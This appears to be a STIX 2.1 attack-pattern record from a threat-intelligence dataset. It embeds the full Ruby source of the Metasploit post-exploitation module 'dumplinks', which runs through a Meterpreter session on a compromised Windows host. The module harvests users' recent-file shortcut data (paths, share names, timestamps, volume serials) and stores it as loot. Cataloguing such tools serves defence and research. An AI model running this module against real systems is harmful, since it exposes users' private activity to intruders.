{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd219117-6017-4c57-9615-70480b39c02a",
    "created": "2024-08-14T16:33:05.060715Z",
    "modified": "2024-08-14T16:33:05.060719Z",
    "name": "Windows Gather Dump Recent Files lnk Info",
    "description": " The dumplinks module is a modified port of Harlan Carvey's lslnk.pl Perl script. This module will parse .lnk files from a user's Recent Documents folder and Microsoft Office's Recent Documents folder, if present. Windows creates these link files automatically for many common file types. The .lnk files contain time stamps, file locations, including share names, volume serial numbers, and more.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/dumplinks.rb",
            "external_id": "dumplinks.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Accounts\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Dump Recent Files lnk Info',\n        'Description' => %q{\n          The dumplinks module is a modified port of Harlan Carvey's lslnk.pl Perl script.\n          This module will parse .lnk files from a user's Recent Documents folder\n          and Microsoft Office's Recent Documents folder, if present.\n          Windows creates these link files automatically for many common file types.\n          The .lnk files contain time stamps, file locations, including share\n          names, volume serial numbers, and more.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'davehull <dph_msf[at]trustedsignal.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_ls\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    enum_users.each do |user|\n      if user['userpath']\n        print_status \"Extracting lnk files for user #{user['username']} at #{user['userpath']}...\"\n        extract_lnk_info(user['userpath'])\n      else\n        print_status \"No Recent directory found for user #{user['username']}. Nothing to do.\"\n      end\n      if user['useroffcpath']\n        print_status \"Extracting lnk files for user #{user['username']} at #{user['useroffcpath']}...\"\n        extract_lnk_info(user['useroffcpath'])\n      else\n        print_status \"No Recent Office files found for user #{user['username']}. Nothing to do.\"\n      end\n    end\n  end\n\n  def enum_users\n    users = []\n    userinfo = {}\n    session.sys.config.getuid\n    userpath = nil\n    env_vars = session.sys.config.getenvs('SystemDrive', 'USERNAME')\n    sysdrv = env_vars['SystemDrive']\n    version = get_version_info\n    if version.build_number >= Msf::WindowsVersion::Vista_SP0\n      userpath = sysdrv + '\\\\Users\\\\'\n      lnkpath = '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\'\n      officelnkpath = '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Office\\\\Recent\\\\'\n    else\n      userpath = sysdrv + '\\\\Documents and Settings\\\\'\n      lnkpath = '\\\\Recent\\\\'\n      officelnkpath = '\\\\Application Data\\\\Microsoft\\\\Office\\\\Recent\\\\'\n    end\n    if is_system?\n      print_status('Running as SYSTEM extracting user list...')\n      session.fs.dir.foreach(userpath) do |u|\n        next if u =~ /^(\\.|\\.\\.|All Users|Default|Default User|Public|desktop.ini)$/\n\n        userinfo['username'] = u\n        userinfo['userpath'] = userpath + u + lnkpath\n        userinfo['useroffcpath'] = userpath + u + officelnkpath\n        userinfo['userpath'] = dir_entry_exists(userinfo['userpath'])\n        userinfo['useroffcpath'] = dir_entry_exists(userinfo['useroffcpath'])\n        users << userinfo\n        userinfo = {}\n      end\n    else\n      uservar = env_vars['USERNAME']\n      userinfo['username'] = uservar\n      userinfo['userpath'] = userpath + uservar + lnkpath\n      userinfo['useroffcpath'] = userpath + uservar + officelnkpath\n      userinfo['userpath'] = dir_entry_exists(userinfo['userpath'])\n      userinfo['useroffcpath'] = dir_entry_exists(userinfo['useroffcpath'])\n      users << userinfo\n    end\n    return users\n  end\n\n  # This is a hack because Meterpreter doesn't support exists?(file)\n  def dir_entry_exists(path)\n    session.fs.dir.entries(path)\n  rescue StandardError\n    return nil\n  else\n    return path\n  end\n\n  def extract_lnk_info(path)\n    session.fs.dir.foreach(path) do |file_name|\n      if file_name =~ /\\.lnk$/ # We have a .lnk file\n        offset = 0 # TODO: Look at moving this to smaller scope\n        lnk_file = session.fs.file.new(path + file_name, 'rb')\n        record = lnk_file.sysread(0x04)\n        if record.unpack('V')[0] == 76 # We have a .lnk file signature\n          file_stat = session.fs.filestat.new(path + file_name)\n          print_status \"Processing: #{path + file_name}.\"\n          @data_out = ''\n\n          record = lnk_file.sysread(0x48)\n          hdr = get_headers(record)\n\n          @data_out += get_lnk_file_mac(file_stat, path, file_name)\n          @data_out += \"Contents of #{path + file_name}:\\n\"\n          @data_out += get_flags(hdr)\n          @data_out += get_attrs(hdr)\n          @data_out += get_lnk_mac(hdr)\n          @data_out += get_showwnd(hdr)\n          @data_out += get_lnk_mac(hdr)\n\n          # advance the file & offset\n          offset += 0x4c\n\n          if shell_item_id_list(hdr)\n            lnk_file.sysseek(offset, ::IO::SEEK_SET)\n            record = lnk_file.sysread(2)\n            offset += record.unpack('v')[0] + 2\n          end\n          # Get File Location Info\n          if (hdr['flags'] & 0x02) > 0\n            lnk_file.sysseek(offset, ::IO::SEEK_SET)\n            record = lnk_file.sysread(4)\n            tmp = record.unpack('V')[0]\n            if tmp > 0\n              lnk_file.sysseek(offset, ::IO::SEEK_SET)\n              record = lnk_file.sysread(0x1c)\n              loc = get_file_location(record)\n              if (loc['flags'] & 0x01) > 0\n\n                @data_out += \"\\tShortcut file is on a local volume.\\n\"\n\n                lnk_file.sysseek(offset + loc['vol_ofs'], ::IO::SEEK_SET)\n                record = lnk_file.sysread(0x10)\n                lvt = get_local_vol_tbl(record)\n                lvt['name'] = lnk_file.sysread(lvt['len'] - 0x10)\n\n                @data_out += \"\\t\\tVolume Name = #{lvt['name']}\\n\" \\\n                             \"\\t\\tVolume Type = #{get_vol_type(lvt['type'])}\\n\" +\n                             \"\\t\\tVolume SN   = 0x%X\" % lvt['vol_sn'] + \"\\n\"\n              end\n\n              if (loc['flags'] & 0x02) > 0\n\n                @data_out += \"\\tFile is on a network share.\\n\"\n\n                lnk_file.sysseek(offset + loc['network_ofs'], ::IO::SEEK_SET)\n                record = lnk_file.sysread(0x14)\n                nvt = get_net_vol_tbl(record)\n                nvt['name'] = lnk_file.sysread(nvt['len'] - 0x14)\n\n                @data_out += \"\\tNetwork Share name = #{nvt['name']}\\n\"\n              end\n\n              if loc['base_ofs'] > 0\n                @data_out += get_target_path(loc['base_ofs'] + offset, lnk_file)\n              elsif loc['path_ofs'] > 0\n                @data_out += get_target_path(loc['path_ofs'] + offset, lnk_file)\n              end\n            end\n          end\n        end\n        lnk_file.close\n        store_loot('host.windows.lnkfileinfo', 'text/plain', session, @data_out, \"#{sysinfo['Computer']}_#{file_name}.txt\", 'User lnk file info')\n      end\n    end\n  end\n\n  # Not only is this code slow, it seems\n  # buggy. I'm studying the recently released\n  # MS Specs for a better way.\n  def get_target_path(path_ofs, lnk_file)\n    name = []\n    lnk_file.sysseek(path_ofs, ::IO::SEEK_SET)\n    record = lnk_file.sysread(2)\n    while (record.unpack('v')[0] != 0)\n      name.push(record)\n      record = lnk_file.sysread(2)\n    end\n    return \"\\tTarget path = #{name.join}\\n\"\n  end\n\n  def shell_item_id_list(hdr)\n    # Check for Shell Item ID List\n    if (hdr['flags'] & 0x01) > 0\n      return true\n    else\n      return nil\n    end\n  end\n\n  def get_lnk_file_mac(file_stat, path, file_name)\n    data_out = \"#{path + file_name}:\\n\"\n    data_out += \"\\tAccess Time       = #{file_stat.atime}\\n\"\n    data_out += \"\\tCreation Date     = #{file_stat.ctime}\\n\"\n    data_out += \"\\tModification Time = #{file_stat.mtime}\\n\"\n    return data_out\n  end\n\n  def get_vol_type(type)\n    vol_type = {\n      0 => 'Unknown',\n      1 => 'No root directory',\n      2 => 'Removable',\n      3 => 'Fixed',\n      4 => 'Remote',\n      5 => 'CD-ROM',\n      6 => 'RAM Drive'\n    }\n    return vol_type[type]\n  end\n\n  def get_showwnd(hdr)\n    showwnd = {\n      0 => 'SW_HIDE',\n      1 => 'SW_NORMAL',\n      2 => 'SW_SHOWMINIMIZED',\n      3 => 'SW_SHOWMAXIMIZED',\n      4 => 'SW_SHOWNOACTIVE',\n      5 => 'SW_SHOW',\n      6 => 'SW_MINIMIZE',\n      7 => 'SW_SHOWMINNOACTIVE',\n      8 => 'SW_SHOWNA',\n      9 => 'SW_RESTORE',\n      10 => 'SHOWDEFAULT'\n    }\n    data_out = \"\\tShowWnd value(s):\\n\"\n    showwnd.each do |key, _value|\n      if (hdr['showwnd'] & key) > 0\n        data_out += \"\\t\\t#{showwnd[key]}.\\n\"\n      end\n    end\n    return data_out\n  end\n\n  def get_lnk_mac(hdr)\n    data_out = \"\\tTarget file's MAC Times stored in lnk file:\\n\"\n    data_out += \"\\t\\tCreation Time     = #{Time.at(hdr['ctime'])}. (UTC)\\n\"\n    data_out += \"\\t\\tModification Time = #{Time.at(hdr['mtime'])}. (UTC)\\n\"\n    data_out += \"\\t\\tAccess Time       = #{Time.at(hdr['atime'])}. (UTC)\\n\"\n    return data_out\n  end\n\n  def get_attrs(hdr)\n    fileattr = {\n      0x01 => 'Target is read only',\n      0x02 => 'Target is hidden',\n      0x04 => 'Target is a system file',\n      0x08 => 'Target is a volume label',\n      0x10 => 'Target is a directory',\n      0x20 => 'Target was modified since last backup',\n      0x40 => 'Target is encrypted',\n      0x80 => 'Target is normal',\n      0x100 => 'Target is temporary',\n      0x200 => 'Target is a sparse file',\n      0x400 => 'Target has a reparse point',\n      0x800 => 'Target is compressed',\n      0x1000 => 'Target is offline'\n    }\n    data_out = \"\\tAttributes:\\n\"\n    fileattr.each do |key, _attr|\n      if (hdr['attr'] & key) > 0\n        data_out += \"\\t\\t#{fileattr[key]}.\\n\"\n      end\n    end\n    return data_out\n  end\n\n  # Function for writing results of other functions to a file\n  def filewrt(file2wrt, data2wrt)\n    output = ::File.open(file2wrt, 'ab')\n    if data2wrt\n      data2wrt.each_line do |d|\n        output.puts(d)\n      end\n    end\n    output.close\n  end\n\n  def get_flags(hdr)\n    flags = {\n      0x01 => 'Shell Item ID List exists',\n      0x02 => 'Shortcut points to a file or directory',\n      0x04 => 'The shortcut has a descriptive string',\n      0x08 => 'The shortcut has a relative path string',\n      0x10 => 'The shortcut has working directory',\n      0x20 => 'The shortcut has command line arguments',\n      0x40 => 'The shortcut has a custom icon'\n    }\n    data_out = \"\\tFlags:\\n\"\n    flags.each do |key, _flag|\n      if (hdr['flags'] & key) > 0\n        data_out += \"\\t\\t#{flags[key]}.\\n\"\n      end\n    end\n    return data_out\n  end\n\n  def get_headers(record)\n    hd = record.unpack('x16V12x8')\n    hdr = Hash.new\n    hdr['flags'] = hd[0]\n    hdr['attr'] = hd[1]\n    hdr['ctime'] = get_time(hd[2], hd[3])\n    hdr['mtime'] = get_time(hd[4], hd[5])\n    hdr['atime'] = get_time(hd[6], hd[7])\n    hdr['length'] = hd[8]\n    hdr['icon_num'] = hd[9]\n    hdr['showwnd'] = hd[10]\n    hdr['hotkey'] = hd[11]\n    return hdr\n  end\n\n  def get_net_vol_tbl(file_net_rec)\n    nv = Hash.new\n    (nv['len'], nv['ofs']) = file_net_rec.unpack('Vx4Vx8')\n    return nv\n  end\n\n  def get_local_vol_tbl(lvt_rec)\n    lv = Hash.new\n    (lv['len'], lv['type'], lv['vol_sn'], lv['ofs']) = lvt_rec.unpack('V4')\n    return lv\n  end\n\n  def get_file_location(file_loc_rec)\n    location = Hash.new\n    (location['len'], location['ptr'], location['flags'],\n      location['vol_ofs'], location['base_ofs'], location['network_ofs'],\n      location['path_ofs']) = file_loc_rec.unpack('V7')\n    return location\n  end\n\n  def get_time(lo_byte, hi_byte)\n    if (lo_byte == 0 && hi_byte == 0)\n      return 0\n    else\n      lo_byte -= 0xd53e8000\n      hi_byte -= 0x019db1de\n      time = (hi_byte * 429.4967296 + lo_byte / 1e7).to_i\n      if time < 0\n        return 0\n      end\n    end\n\n    return time\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}